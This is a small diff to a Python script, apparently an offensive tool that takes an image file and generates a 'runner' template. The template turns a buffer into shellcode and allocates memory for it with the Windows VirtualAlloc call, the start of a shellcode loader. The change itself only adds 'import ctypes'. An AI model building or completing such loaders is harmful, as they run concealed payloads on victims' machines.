@@ -8,6 +8,7 @@ parser.add_argument('-i', '--image', required=True, help='Please supply file pat
 args = parser.parse_args()
 
 runner_string = """
+import ctypes
 shellcode = bytearray(buf)
 pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                       ctypes.c_int(len(shellcode)),
